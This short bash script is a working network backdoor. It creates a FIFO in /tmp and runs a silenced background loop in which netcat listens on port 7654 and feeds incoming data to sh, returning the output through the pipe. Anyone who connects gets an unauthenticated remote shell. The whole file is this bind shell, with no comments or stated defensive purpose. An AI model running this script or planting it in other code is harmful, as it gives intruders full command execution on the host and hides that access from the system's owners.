#!/usr/bin/env bash

cd /tmp
mkfifo FIFO > /dev/null 2>&1

listen() {
  while [ 1 ]; do
    nc -l -p 7654 < FIFO 2>.error | sh > FIFO;
    if [ -f .error ]; then
      rm .error;
      break;
    fi;
  done;
}

listen & > /dev/null 2>&1
